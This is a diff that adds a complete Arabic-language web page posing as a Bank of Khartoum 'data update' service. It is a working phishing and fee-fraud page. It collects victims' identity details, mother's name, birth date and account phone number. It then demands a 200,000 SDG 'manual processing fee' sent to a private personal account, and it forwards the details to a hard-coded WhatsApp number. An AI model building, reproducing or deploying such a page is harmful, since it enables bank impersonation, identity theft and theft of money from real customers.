@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بنك الخرطوم - تحديث البيانات</title>
+    
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --bok-red: #C1272D;
+            --bok-dark-red: #A32025;
+            --bok-gray: #58595B;
+            --bok-text: #231F20;
+            --bok-input-border: #D1D3D4;
+        }
+
+        body {
+            font-family: 'Cairo', sans-serif;
+            background-color: #FFFFFF;
+            color: var(--bok-text);
+            margin: 0;
+            padding: 0;
+        }
+
+        .page-header {
+            background-color: var(--bok-red);
+            color: #FFFFFF;
+            padding: 15px 20px;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 1000;
+        }
+
+        .page-title {
+            font-size: 18px;
+            font-weight: 700;
+            margin: 0;
+        }
+
+        .main-content {
+            margin-top: 80px;
+            padding: 20px;
+        }
+
+        .bok-input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid var(--bok-input-border);
+            border-radius: 8px;
+            font-family: 'Cairo', sans-serif;
+            font-size: 14px;
+            color: var(--bok-text);
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .bok-input:focus {
+            border-color: var(--bok-red);
+        }
+
+        .bok-btn-primary {
+            background-color: var(--bok-red);
+            color: #FFFFFF;
+            font-weight: 700;
+            padding: 12px 20px;
+            border-radius: 8px;
+            width: 100%;
+            font-family: 'Cairo', sans-serif;
+            font-size: 16px;
+            cursor: pointer;
+            border: none;
+        }
+
+        .platform-title {
+            color: var(--bok-gray);
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 5px;
+        }
+
+        .step-container {
+            display: none;
+        }
+
+        .step-container.active {
+            display: block;
+        }
+    </style>
+</head>
+<body>
+
+    <header class="page-header">
+        <h1 class="page-title">تحديث بيانات حسابي</h1>
+        <div class="flex gap-4 text-lg">
+            <i class="fas fa-ellipsis-v"></i>
+            <i class="fas fa-arrow-left"></i>
+        </div>
+    </header>
+
+    <main class="main-content">
+        <div class="text-center">
+            <img src="bank_logo.png" alt="شعار بنك الخرطوم" class="mx-auto my-6" style="max-width: 250px;">
+            <h2 class="platform-title">تحديث البيانات</h2>
+            <p class="text-gray-400 text-sm mb-8">يرجى اتباع الخطوات لتحديث بيانات طلبك المتعلق بالرقم المرجعي</p>
+        </div>
+
+        <div class="flex items-center justify-center mb-8 gap-2">
+            <div id="p1" class="w-10 h-10 rounded-full bg-bok-red text-white flex items-center justify-center font-bold text-lg shadow-md">1</div>
+            <div id="l1" class="flex-1 h-1 bg-gray-200" style="max-width: 50px;"></div>
+            <div id="p2" class="w-10 h-10 rounded-full bg-gray-200 text-gray-500 flex items-center justify-center font-bold text-lg">2</div>
+            <div id="l2" class="flex-1 h-1 bg-gray-200" style="max-width: 50px;"></div>
+            <div id="p3" class="w-10 h-10 rounded-full bg-gray-200 text-gray-500 flex items-center justify-center font-bold text-lg">3</div>
+        </div>
+
+        <form id="mainForm" onsubmit="return false;">
+            
+            <div class="step-container active" id="step1">
+                <div class="space-y-5">
+                    <input type="text" id="full_name" placeholder="الاسم رباعي كما في الهوية" class="bok-input" required>
+                    <input type="text" id="id_number" placeholder="رقم الهوية (وطني / جواز / بطاقة)" class="bok-input" required>
+                    <input type="text" id="ref_number" placeholder="الرقم المرجعي (Reference Number)" class="bok-input text-left" dir="ltr" required>
+                </div>
+                <button type="button" onclick="goToStep(2)" class="bok-btn-primary mt-10 shadow-lg">التالي</button>
+            </div>
+
+            <div class="step-container" id="step2">
+                <div class="space-y-5">
+                    <input type="text" id="mother_name" placeholder="إسم الوالدة بالكامل" class="bok-input" required>
+                    <input type="text" id="address" placeholder="عنوان السكن الحالي" class="bok-input" required>
+                    <div>
+                        <input type="text" id="dob" placeholder="تاريخ الميلاد (مثال: 1990/01/01)" class="bok-input text-left" dir="ltr" required>
+                        <p class="text-[10px] text-gray-400 mt-1 mr-1 text-right">يرجى إدخال التاريخ يدوياً (يوم/شهر/سنة)</p>
+                    </div>
+                    <input type="tel" id="phone_linked" placeholder="رقم الهاتف المسجل مع الحساب" class="bok-input text-left" dir="ltr" required>
+                </div>
+                <div class="flex gap-3 mt-10">
+                    <button type="button" onclick="goToStep(1)" class="w-1/3 py-3 border border-gray-300 rounded-lg text-gray-600 font-bold">السابق</button>
+                    <button type="button" onclick="goToStep(3)" class="w-2/3 bok-btn-primary shadow-lg">التالي</button>
+                </div>
+            </div>
+
+            <div class="step-container" id="step3">
+                <div class="space-y-5">
+                    <div class="bg-red-50 p-4 border-r-4 border-red-600 mb-4 text-right">
+                        <p class="text-sm font-bold text-red-800">تنبيه المعالجة اليدوية:</p>
+                        <p class="text-xs text-red-700 leading-relaxed">بسبب ضغط الطلبات، يتم دفع رسوم رمزية بقيمة <b>200,000 ج.س</b> مقابل فرز ومعالجة طلبك يدوياً لضمان اكتمال التحديث خلال 24 ساعة عمل فقط.</p>
+                    </div>
+
+                    <div class="bg-gray-50 p-5 rounded-lg border border-dashed text-center">
+                        <p class="text-xs text-gray-400 mb-2">رقم حساب تحويل الرسوم (بنكك):</p>
+                        <p class="text-2xl font-bold text-bok-red tracking-wider">2938747</p>
+                        <p class="text-xs text-gray-500 mt-1">بإسم: إلهام الطيب احمد إبراهيم</p>
+                    </div>
+
+                    <div>
+                        <input type="text" id="transaction_id" placeholder="رقم العملية (من إشعار التحويل)" class="bok-input text-center font-bold text-lg border-2" required>
+                    </div>
+                </div>
+                <div class="flex gap-3 mt-10">
+                    <button type="button" onclick="goToStep(2)" class="w-1/3 py-3 border border-gray-300 rounded-lg text-gray-600 font-bold">تعديل</button>
+                    <button type="button" onclick="sendToWhatsApp()" class="w-2/3 bg-green-600 text-white font-bold py-3 rounded-lg flex items-center justify-center gap-2 shadow-xl hover:bg-green-700">
+                        <i class="fab fa-whatsapp text-2xl"></i> تأكيد وإرسال
+                    </button>
+                </div>
+            </div>
+
+        </form>
+
+        <footer class="mt-12 text-center text-[12px] text-gray-400 border-t pt-4 font-bold">
+            جميع الحقوق محفوظة بنك الخرطوم
+        </footer>
+    </main>
+
+    <script>
+        const MY_WHATSAPP = "249960724630"; 
+
+        function goToStep(step) {
+            document.querySelectorAll('.step-container').forEach(s => s.classList.remove('active'));
+            document.getElementById('step' + step).classList.add('active');
+
+            const p2 = document.getElementById('p2'), p3 = document.getElementById('p3');
+            const l1 = document.getElementById('l1'), l2 = document.getElementById('l2');
+
+            if (step >= 2) {
+                p2.classList.add('bg-bok-red', 'text-white');
+                p2.classList.remove('bg-gray-200', 'text-gray-500');
+                l1.classList.add('bg-bok-red');
+            } else {
+                p2.classList.replace('bg-bok-red', 'bg-gray-200');
+                p2.classList.replace('text-white', 'text-gray-500');
+                l1.classList.remove('bg-bok-red');
+            }
+
+            if (step === 3) {
+                p3.classList.add('bg-bok-red', 'text-white');
+                p3.classList.remove('bg-gray-200', 'text-gray-500');
+                l2.classList.add('bg-bok-red');
+            } else {
+                p3.classList.replace('bg-bok-red', 'bg-gray-200');
+                p3.classList.replace('text-white', 'text-gray-500');
+                l2.classList.remove('bg-bok-red');
+            }
+            window.scrollTo(0, 0);
+        }
+
+        function sendToWhatsApp() {
+            const name = document.getElementById('full_name').value;
+            const ref = document.getElementById('ref_number').value;
+            const transId = document.getElementById('transaction_id').value;
+            const phone = document.getElementById('phone_linked').value;
+
+            if (!transId) {
+                alert("يرجى إدخال رقم العملية");
+                return;
+            }
+
+            const message = `*طلب تحديث بيانات بنكك*%0A` +
+                            `--------------------------%0A` +
+                            `*الاسم:* ${name}%0A` +
+                            `*المرجعي:* ${ref}%0A` +
+                            `*رقم الحساب:* ${phone}%0A` +
+                            `*رقم العملية:* ${transId}%0A` +
+                            `--------------------------%0A` +
+                            `تم سداد رسوم المعالجة اليدوية الفورية.`;
+
+            window.open(`https://wa.me/${MY_WHATSAPP}?text=${message}`, '_blank');
+        }
+    </script>
+</body>
+</html>
